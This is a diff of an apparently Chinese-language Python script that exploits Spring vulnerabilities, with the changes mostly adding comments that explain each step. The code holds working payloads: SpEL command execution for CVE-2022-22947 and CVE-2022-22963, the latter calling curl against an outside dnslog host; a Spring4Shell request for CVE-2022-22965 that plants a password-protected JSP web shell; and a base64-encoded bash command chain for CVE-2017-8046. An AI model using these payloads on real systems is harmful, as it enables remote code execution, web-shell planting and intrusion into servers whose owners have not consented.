@@ -31,13 +31,11 @@ data = {"id": routename,
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
              "uri": "http://hello.com"}
 r=requests.post(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
-if r.status_code==201:
-    #print("[+]存在CVE-2022-22947漏洞："+url+"/actuator/gateway/routes/"+routename)
+if r.status_code==201:##创建
     r=requests.post(url+"actuator/gateway/refresh",headers=headers,data=json.dumps(data))
-    if r.status_code==200:
-        #print("[+]刷新成功")
+    if r.status_code==200:##刷新
         r=requests.get(url+"actuator/gateway/routes/"+routename,headers=headers,data=json.dumps(data))
-        if r.status_code==200:
+        if r.status_code==200:##判断并输出结果
             print(colorama.Fore.CYAN+"[+]"+url+"存在CVE-2022-22947漏洞，输出结果")
             print("########################################################")
             a=r.json()
@@ -50,7 +48,7 @@ print("########################################################")
 
 #cve-2022-22963
 command='curl '+dnslog
-payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'
+payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'##构造payload，直接执行52行的command
 headers2 = {
     'spring.cloud.function.routing-expression': payload,
     'Accept-Encoding': 'gzip, deflate',
@@ -74,7 +72,7 @@ else:
 
 print('')
 print("########################################################")
-#cve-2022-22965
+#cve-2022-22965，这个误报可能性很大，但是不想改
 headers3 = {
     "suffix": "%>//",
     "c1": "Runtime",
@@ -82,7 +80,7 @@ headers3 = {
     "DNT": "1",
     "Content-Type": "application/x-www-form-urlencoded",
 }
-url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
+url1=url+'?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='##payload
 r=requests.get(url=url1,headers=headers3)
 if r.status_code==200:
     print(colorama.Fore.CYAN+"[+]"+url+"目标可能存在CVE-2022-22965漏洞，访问"+url+"tomcatwar.jsp?pwd=j&cmd=id")
@@ -122,7 +120,7 @@ cve_2017_8046_base_drop1=cve_2017_8046_base3.strip('b')
 cve_2017_8046_base_drop2=cve_2017_8046_base_drop1.strip("'")
 cve_2017_8046_base_drop_end=cve_2017_8046_base_drop2
 cve_2017_8046_payload1=('bash -c {echo,'+cve_2017_8046_base_drop_end+'}|{base64,-d}|{bash,-i}').encode()
-cve_2017_8046_payload_end = ','.join(str(i) for i in list(cve_2017_8046_payload1))
+cve_2017_8046_payload_end = ','.join(str(i) for i in list(cve_2017_8046_payload1))##118-125行对payload进行base，ascii编码
 
 cve_2017_8046_d=(
 '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{'+cve_2017_8046_payload_end+'}))/lastname", "value": "vulhub" }]'
@@ -131,7 +129,6 @@ cve_2017_8046_h={
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
     'Content-Type': 'application/json-patch+json'
 }
-print(cve_2017_8046_payload_end)
 cve_2017_8046_path='customers/1'##漏洞路径
 cve_2017_8046_r=requests.patch(url=url+cve_2017_8046_path,headers=cve_2017_8046_h,data=cve_2017_8046_d)
 if cve_2017_8046_r.status_code==400:
@@ -197,5 +194,5 @@ if __name__ == "__main__":
 
 print("扫描完毕")
 
-end=input('你的支持是我的动力，如果觉得写得不错，欢迎加入我们，微信群：http://mrw.so/6fMUda')
+end=input('你的支持是我的动力，如果觉得写得不错，欢迎关注微信公众号：http://mrw.so/6fMUda')
 
